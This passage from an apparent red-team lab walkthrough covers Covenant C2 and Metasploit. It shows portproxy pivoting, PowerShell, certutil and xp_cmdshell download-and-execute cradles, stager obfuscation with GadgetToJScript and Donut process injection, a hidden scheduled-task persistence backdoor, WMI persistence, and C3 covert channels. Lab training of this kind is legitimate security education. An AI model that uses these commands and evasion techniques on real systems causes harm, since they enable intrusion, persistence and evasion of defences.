<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image301.png" srcset="/img/loading.gif"></p>
<p>It is being hosted on port 8888.</p>
<p>A meterpreter handler is prepared:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">set</span> payload windows/x64/meterpreter_reverse_https<br>msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">set</span> lhost <span class="hljs-number">10.100</span><span class="hljs-number">.10</span><span class="hljs-number">.2</span><br>msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">set</span> lport <span class="hljs-number">8443</span><br>msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; run<br></code></pre></div></td></tr></table></figure>

<p>We also command the Grunt to download and execute the payload:</p>
<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> <span class="hljs-string">&quot;iex (new-object net.webclient).downloadstring(&#x27;http://10.100.10.2:8888/msf.ps1&#x27;)&quot;</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image302.png" srcset="/img/loading.gif"></p>
<p>As the payload is executed, a meterpreter session is achieved.</p>
<p>We can now try to create portproxy paths to another machine. As an example, we will create a portproxy path in order to create a SMB Grunt on the UATSERVER machine.</p>
<p>First, we create a listener. Note that at the time of writing, Covenant does not feature pivoting on its own, so we are creating a workaround.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image303.png" srcset="/img/loading.gif"></p>
<p>Our pivot point has two IP addresses</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image304.png" srcset="/img/loading.gif"></p>
<p>We will bind our Listener to our kali ip address but set the “Connect address” to the second network interface. This is equivalent of “LHOST” in covenant’s implant.</p>
<p>Now, in Metasploit we will forward that port to our listener. Note that you might want to expose port 9080 additionally on the docker instance if you are using Covenant from Docker. The process of exposing a port has already been shown.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image305.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image306.png" srcset="/img/loading.gif"></p>
<p>As such launcher is created, we go to the listener menu, choose 9080 and “Download” the file. It is automatically being saved under name “35”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image307.png" srcset="/img/loading.gif"></p>
<p>Next, we add another rule to portproxy module in order to expose the launcher.</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set LOCAL_ADDRESS <span class="hljs-number">10.100</span>.<span class="hljs-number">10.250</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set LOCAL_PORT <span class="hljs-number">8888</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set CONNECT_ADDRESS <span class="hljs-number">10.100</span>.<span class="hljs-number">10.2</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set CONNECT_PORT <span class="hljs-number">8888</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set session <span class="hljs-number">1</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; run<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image308.png" srcset="/img/loading.gif"></p>
<p>We can now execute the download on UATSERVER. It can be done using xp_cmdshell or powershell directly, using command:</p>
<figure class="highlight ceylon"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ceylon">iex (<span class="hljs-keyword">new</span>-<span class="hljs-keyword">object</span> net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.100.10.250:8888/35&#x27;</span>)<br></code></pre></div></td></tr></table></figure>

<p>The file is being downloaded.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image309.png" srcset="/img/loading.gif"></p>
<p>After a while, you can command jumpbox to connect to uatserver’s newly created pipe in order to activate the SMBGrunt.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image310.png" srcset="/img/loading.gif"></p>
<p>After a short period of staging, the smbgrunt should appear in your Grunts list.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image311.png" srcset="/img/loading.gif"></p>
<p>If you would like to clear the portproxy rules you created, issue the below command</p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">netsh <span class="hljs-keyword">interface</span> <span class="hljs-symbol">portproxy</span> <span class="hljs-symbol">reset</span><br></code></pre></div></td></tr></table></figure>

<h2 id="Direct-pivoting-with-portproxy-and-Covenant"><a href="#Direct-pivoting-with-portproxy-and-Covenant" class="headerlink" title="Direct pivoting with portproxy and Covenant"></a>Direct pivoting with portproxy and Covenant</h2><p>In the below exercise we will utilize Metasploit’s portproxy in order to pivot a HTTP listener from different network towards our HTTP Listener.</p>
<p>Be sure that the listener port is exposed out of docker in case you are using the docker release.</p>
<p>First, we create a listener.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image312.png" srcset="/img/loading.gif"></p>
<p>It will be bound to our local Kali instance but its connect address will be this of the Jumpbox machine. This way, once a launcher connected with that one will be created and run, it will try to reach 10.100.11.250 on port 9080.</p>
<p>In order to prepare that port, we will also create a portproxy rule on jumpbox server.</p>
<p>First, we will hook Jumpbox with meterpreter. Any payload delivery technique is fine. We simply generated a msfvenom payload and saved it to Kali.</p>
<p>As soon as meterpreter’s session is established, the portproxy module is used with two rules.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image313.png" srcset="/img/loading.gif"></p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msf5 exploit(multi<span class="hljs-regexp">/handler) &gt; use post/</span>windows<span class="hljs-regexp">/manage/</span>portproxy<br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set CONNECT_ADDRESS <span class="hljs-number">10.100</span>.<span class="hljs-number">10.2</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set CONNECT_PORT <span class="hljs-number">9080</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set LOCAL_ADDRESS <span class="hljs-number">10.100</span>.<span class="hljs-number">11.250</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set LOCAL_PORT <span class="hljs-number">9080</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set session <span class="hljs-number">1</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; run<br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set LOCAL_PORT <span class="hljs-number">9000</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set LOCAL_ADDRESS <span class="hljs-number">10.100</span>.<span class="hljs-number">11.250</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set CONNECT_PORT <span class="hljs-number">9000</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set CONNECT_ADDRESS <span class="hljs-number">10.100</span>.<span class="hljs-number">10.2</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; set session <span class="hljs-number">1</span><br>msf5 post(windows<span class="hljs-regexp">/manage/</span>portproxy) &gt; run<br></code></pre></div></td></tr></table></figure>

<p>We have now opened two paths and both lead from jumpbox machine to our Kali machine. One on port 9080 which will be used for the listener and one on port 9000 which will be used to download the payload.</p>
<p>Now, we can go to Launchers, choose PowerShell and choose Listener “10.100.11.250”. Then, Download it.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image314.png" srcset="/img/loading.gif"></p>
<p>The downloaded file is renamed, in our case, to 11.ps1.</p>
<p>It is moved to a directory where Python Simple Server listens on port 9000.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image315.png" srcset="/img/loading.gif"></p>
<p>Port 9000 is exposed also on Jumpbox. The last part will involve downloading and executing the file from UATSERVER which is in a different network.</p>
<p>Now, use any code execution technique on UATSERVER to download an execute the powershell payload.</p>
<p>You can do this from the compromised SQL server or via an RDP session if you would like to debug it more closely. You can try either</p>
<p>C:\MSSQLDB$\exception directory or C:\windows\tracing which is a world-writable location by default.</p>
<p>We use the commands:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mssql">EXEC xp_cmdshell &#x27;powershell curl http://10.100.11.250:9000/11.ps1 -outfile c:\windows\tracing\11.ps1&#x27;;<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image316.png" srcset="/img/loading.gif"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mssql">EXEC xp_cmdshell &#x27;powershell c:\windows\tracing\11.ps1&#x27;;<br></code></pre></div></td></tr></table></figure>

<p>or</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">powershell curl &lt;http:<span class="hljs-regexp">//</span><span class="hljs-number">10.100</span>.<span class="hljs-number">11.250</span>:<span class="hljs-number">9000</span>/<span class="hljs-number">11</span>.ps1&gt;<br>.\<span class="hljs-number">11</span>.ps1<br></code></pre></div></td></tr></table></figure>

<p>In a short while, we can see that a UATSERVER grunt will appear.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image317.png" srcset="/img/loading.gif"></p>
<p>We can now go to the “interact” tab and issue commands. For example, ipconfig allows us to be sure that we are interacting with a computer in a completely different network.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image318.png" srcset="/img/loading.gif"></p>
<h2 id="Using-Covenant-launchers-with-Gadget-to-Jscript"><a href="#Using-Covenant-launchers-with-Gadget-to-Jscript" class="headerlink" title="Using Covenant launchers with Gadget to Jscript"></a>Using Covenant launchers with Gadget to Jscript</h2><p><strong>Note: this task should be (at least partially) performed on a local machine. Later on, you can try to upload the compiled launcher to win10-web.</strong></p>
<p>As we already mentioned, Covenant launchers can be also exported into the form of .NET code, which can be for further obfuscated or modified. In this exercise we will connect with the win10-web machine of the lab in order to download and execute the obfuscated launcher code.</p>
<p>We will start with a local machine where we can compile the GadgetToJScript tool using Visual Studio 2017. The tool has been initially released in 2017 by James Forshaw, and has recently been refreshed for red-teaming purposes. You can find the refreshed tool here:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/GadgetToJScript">https://github.com/rasta-mouse/GadgetToJScript</a></p>
<p>Download the archive and open the .sln file in Visual Studio. It already has a reference to a TestClass.cs</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image319.png" srcset="/img/loading.gif"></p>
<p>The TestClass.cs is being compiled into a DLL which we will not use but the file itself will be used with the GadgetToJScript payload generator.</p>
<p>Let’s go to our Covenant instance and choose “Binary” launcher. Then, we go to “Code” and copy it.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image320.png" srcset="/img/loading.gif"></p>
<p>Let’s paste the code into Visual Studio TestClass.cs</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image321.png" srcset="/img/loading.gif"></p>
<p>Now, we set the project to “Release” and “x86” and build it.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image322.png" srcset="/img/loading.gif"></p>
<p>We can disregard the dll file for now. Let’ go to the GadgetToJScript directory and execute it with the following parameters:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image323.png" srcset="/img/loading.gif"></p>
<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GadgetToJScript.exe -i .<span class="hljs-symbol">\.</span>.<span class="hljs-symbol">\.</span>.<span class="hljs-symbol">\.</span>.<span class="hljs-symbol">\.</span>.<span class="hljs-symbol">\T</span>estPayload<span class="hljs-symbol">\T</span>estClass.cs -r System.Core.dll -w vbs -o c:<span class="hljs-symbol">\u</span>sers<span class="hljs-symbol">\w</span>in10en<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\v</span>bs1<br></code></pre></div></td></tr></table></figure>

<p>The -I specifies the input file to be obfuscated. -r allows to specify additional assembly references -w specifies the output format (hta, vbs, wsh or js) and -o specifies the output filename without an extension.</p>
<p>In that case, we generated vbs1.vbs. Let’s transfer it to win10-web and execute it. We can access the command line from the compromised machine using Remote Desktop. The following command can be used to download vbs1:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">certutil</span>.exe -urlcache -split -f http://<span class="hljs-number">10.100.10.2:9000</span>/vbs<span class="hljs-number">1</span>.vbs vbs<span class="hljs-number">1</span>.vbs<br><span class="hljs-attribute">wscript</span>.exe vbs<span class="hljs-number">1</span>.vbs<br></code></pre></div></td></tr></table></figure>

<p>We can see that a new grunt has been activated.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image324.png" srcset="/img/loading.gif"></p>
<p>We will now add another layer of obfuscation to the grunt stager. Let’s start once again with generating a Binary launcher. This time, we want to download the .exe Grunt Stager. We will obfuscate it using Donut. Donut is a .NET shellcode generation tool and it can be downloaded (as pre-built release) from here:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/TheWover/donut/releases">https://github.com/TheWover/donut/releases</a></p>
<p>We named our Grunt Stager gs.exe and used its name as an argument to the donut command.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image325.png" srcset="/img/loading.gif"></p>
<p>In the next step, we will convert the shellcode to base64 using PowerShell’s native functionality:</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;C:\Users\win10en\Desktop\donut_v0.9.3 (3)\loader.bin&quot;</span><br>[<span class="hljs-type">Convert</span>]::ToBase64String([<span class="hljs-type">IO.File</span>]::ReadAllBytes(<span class="hljs-variable">$f</span>)) &gt; b64.txt<br></code></pre></div></td></tr></table></figure>

<p>Now, let’s reopen the project we used to compile Gadget to Jscript or the TestClass.cs alone (we recommend using visual studio, it will highlight potential syntax errors related to extra characters that might break your payload)</p>
<p>Delete the entire class TestClass.cs and paste the Process Injection PoC that can be found on the below github gist. The PoC will spawn notepad and inject shellcode to it. This adds another layer of obfuscation to our Grunt Stager.</p>
<p><a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13/raw/238ed3339a458ce0260f98dc18a38fdbed420457/Payload.txt">https://gist.githubusercontent.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13/raw/238ed3339a458ce0260f98dc18a38fdbed420457/Payload.txt</a></p>
<p>Then, navigate to the shellcode placeholder and paste the content of b64.txt</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image326.png" srcset="/img/loading.gif"></p>
<p>Now you can run GadgetToJScript as previously in order to compile a scriptlet executable out of the TestClass.cs:</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">.\GadgetToJScript.exe <span class="hljs-literal">-i</span> .\..\..\..\..\TestPayload\TestClass.cs <span class="hljs-literal">-r</span> System.Core.dll <span class="hljs-literal">-w</span> vbs <span class="hljs-literal">-o</span> c:\users\win10en\Desktop\vq<br></code></pre></div></td></tr></table></figure>

<p>We can again transfer it to Win10-web using certutil as previously:</p>
<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">certutil<span class="hljs-selector-class">.exe</span> -urlcache -split -f http:<span class="hljs-comment">//10.100.10.2:9000/vq.vbs vq.vbs</span><br>wscript<span class="hljs-selector-class">.exe</span> vq.vbs<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image327.png" srcset="/img/loading.gif"></p>
<p>We can observe a new grunt being spawned.</p>
<h1 id="LOCAL-TASKS"><a href="#LOCAL-TASKS" class="headerlink" title="LOCAL TASKS"></a>LOCAL TASKS</h1><p>These tasks are to be performed on a local windows VM since they are non-domain specific. However, they can still be performed within a domain environment so you can try them within the lab at a later time.</p>
<h2 id="Local-Persistence"><a href="#Local-Persistence" class="headerlink" title="Local Persistence"></a>Local Persistence</h2><p><strong>Note: this task is designed to be executed locally, but you can try to perform it in the lab.</strong></p>
<p>Covenant also offers persistence methods to maintain access to a victim machine. Obviously, your shell is not persistent and might be lost due to various reasons like a reboot or a logout. This is something that we can’t allow to happen - especially when a grunt is the outcome of a thoroughly prepared phishing campaign which cost a lot of time and effort.</p>
<p>Persistence can be achieved in the context of a current user or an elevated party like local system. Of course, a lower privilege level means lower capabilities but also a lower detection possibility, and higher capabilities associated with local system persistence are more likely to be detected.</p>
<p>For user-land persistence, you might consider techniques like:</p>
<ul>
<li><p>  Scheduled tasks</p>
</li>
<li><p>  Autorun (Registry)</p>
</li>
<li><p>  Startup folder</p>
</li>
<li><p>  COM and DLL Hijacking</p>
</li>
</ul>
<p>Covenant already has some built-in persistence modules associated with SharpSploit. However, let’s try to execute custom Task Scheduled persistence using Covenant.</p>
<p>First, let’s create a script on the Attacker machine:</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">New-ScheduledTaskPersistence</span></span> &#123;   <br>    <span class="hljs-variable">$TaskName</span> = <span class="hljs-string">&quot;Persistence&quot;</span><br>    <span class="hljs-variable">$Trigger</span> = <span class="hljs-built_in">New-ScheduledTaskTrigger</span>   <br>    <span class="hljs-literal">-Daily</span>   <br>    <span class="hljs-literal">-At</span> <span class="hljs-number">09</span>:<span class="hljs-number">00</span>   <br>    <span class="hljs-variable">$Action</span> = <span class="hljs-built_in">New-ScheduledTaskAction</span>   <br>    <span class="hljs-literal">-Execute</span> <span class="hljs-string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span>   <br>    <span class="hljs-literal">-Argument</span> <span class="hljs-string">&quot;-Sta -Nop -Window Hidden -EncodedCommand [PAYLOAD OF THE BACKDOOR]&quot;</span>  <br>    <span class="hljs-literal">-WorkingDirectory</span> <span class="hljs-string">&quot;C:\Windows\System32&quot;</span>   <br>    <span class="hljs-built_in">Register-ScheduledTask</span>   <br>    <span class="hljs-literal">-TaskName</span> <span class="hljs-variable">$TaskName</span>   <br>    <span class="hljs-literal">-Trigger</span> <span class="hljs-variable">$Trigger</span>   <br>    <span class="hljs-literal">-Action</span> <span class="hljs-variable">$Action</span>   <br>    <span class="hljs-literal">-Force</span><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>Then, use the command PowerShellImport. Inside theInteract menu.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image328.png" srcset="/img/loading.gif"></p>
<p>You will be able to choose your file to be executed on the remote machine. Apart from persistence, any other task with custom PowerShell can be executed this way.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image329.png" srcset="/img/loading.gif"></p>
<h2 id="WMI-Backdoor"><a href="#WMI-Backdoor" class="headerlink" title="WMI Backdoor"></a>WMI Backdoor</h2><p><strong>Note: this task is designed to be executed locally, but you can try to perform it in the lab.</strong></p>
<p>An example of System-level persistence might be a WMI Subscription.</p>
<p>WMI backdoor is an advanced and very complex technique. A whitepaper describing it has been released and can be found at <a target="_blank" rel="noopener" href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf">https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf</a></p>
<p>and <a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf</a></p>
<p>WMI backdoor can be executed from the “tasks” menu.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image330.png" srcset="/img/loading.gif"></p>
<h2 id="Connecting-Covenant-with-C3-Framework"><a href="#Connecting-Covenant-with-C3-Framework" class="headerlink" title="Connecting Covenant with C3 Framework"></a>Connecting Covenant with C3 Framework</h2><p><strong>Note: this task should be executed on your local machine.</strong></p>
<p>C3 is (at least in the beginning of 2020) a fairly new open-source framework which is targeted to help Command and Control operators establish covert channels to help keep the agent-c2 communication secure.</p>
<p>For the time being, C3 by default offers integration with Cobalt Strike and Covenant - of course, custom C2 integration can be achieved however this would require analyzing the source code to create modules which can communicate with it.</p>
<p>You can download the C3 framework from GitHub. You can either go the hard way which includes compilation (it might require you to have the latest Visual Studio 2019) or download a pre-built release.</p>
<p>We will use the ready release in order to show you its capabilities in connecting with Covenant.</p>
<p>Note, that this exercise has to be set up locally.</p>
<p>We will go to <a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/C3/releases">https://github.com/FSecureLABS/C3/releases</a> and download the release. Then we simply unpack the zip archive and navigate to the folder it contains.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image331.png" srcset="/img/loading.gif"></p>
<p>Let’s open an administrative cmd console and launch StartWebController.cmd. Then navigate to localhost:52935</p>
<p>You will be displayed a window named Gateway Setup. Name it as you wish and click download, then unpack the zip archive you downloaded and run the executable it contains.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image332.png" srcset="/img/loading.gif"></p>
<p>Your screen should now look like below:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image333.png" srcset="/img/loading.gif"></p>
<p>Before we proceed forward, let us first explain what is the gateway and what else is required for our setup. As already said, C3 is responsible for creating reliable channels between implants and C2, so the gateway is a node that will allow you to connect both your channel C2 and the machine you compromised. In C3 Framework’s vocabulary there are the following terms:</p>
<ul>
<li><p>  Connector - a connection between Gateway and the C2 Framework. By default, a connection with Covenant and Cobalt Strike is supported.</p>
</li>
<li><p>  Gateway - a main node which allows to set up other infrastructure around it</p>
</li>
<li><p>  Channel - a communication medium, by default we can use Slack or UNCShare. Setting up a Slack channel is not documented and requires setting up a new Slack app which requires some specific permissions. We will focus on the UNCPath channel - which involves a network share available for read and write for both victim and the machine where your gateway is set up.</p>
</li>
<li><p>  Relay - this is the payload of C3, however, it does not allow you to execute any commands. It simply ensures access to the Channel and connection to Gateway.</p>
</li>
</ul>
<p>First, a Gateway is required. Then, you need a Channel, a Connector to the C2, and a Relay which is started on the victim machine. Once Relay is started, you can start to interact with it via the C2 interface. Let’s see how this set up can be achieved. There’s also one last thing that has to be completed - a helper for Covenant connector named C2Bridge. You can download it here:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cobbr/C2Bridge">https://github.com/cobbr/C2Bridge</a></p>
<p>You will need VisualStudio 2019 and .NET core 2.2 to compile it or, as you open the .sln file in Visual Studio 2017 with .NET core 2.1, you need to go to C2Bridge.csproj and change the to netcoreapp2.1 as per the below screenshot.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image334.png" srcset="/img/loading.gif"></p>
<p>Then, compile the file as Release and note down the path where your result DLL is saved.</p>
<p>First, let’s prepare a network share that will be accessible from the victim. We created a c:\ folder accessible to group Everyone. Our machine hostname is VICTIM.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image335.png" srcset="/img/loading.gif"></p>
<p>Now, go to the control panel of C3 and set up a new channel. Double click on gateway icon and choose “Command Center”. Choose the command “AddChannelUncShareFile”. We leave the two next random values unchanged and enter the filesystem path of our network share.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image336.png" srcset="/img/loading.gif"></p>
<p>Next, the Send Command is clicked. The channel should be now visible on the infrastructure map.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image337.png" srcset="/img/loading.gif"></p>
<p>Now, let’s double-click on the newly created “Channel” icon. Once you point the cursor onto “Interface options” a menu will drop down. Choose “New relay”. Note, that in Relay options, all the channel parameters including share location are already set up. You just need to change the relay name if you want. We will name it victim-relay.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image338.png" srcset="/img/loading.gif"></p>
<p>You should be now able to download the relay. It is an agent launcher - before moving it into a real victim system it should be obfuscated.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image339.png" srcset="/img/loading.gif"></p>
<p>As we run the relay on victim system the infrastructure map is updated:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image340.png" srcset="/img/loading.gif"></p>
<p>Now, let’s connect Covenant to our infrastructure. You might want to use it out of Kali and not from docker - we simply set it up using instructions present on its official page:</p>
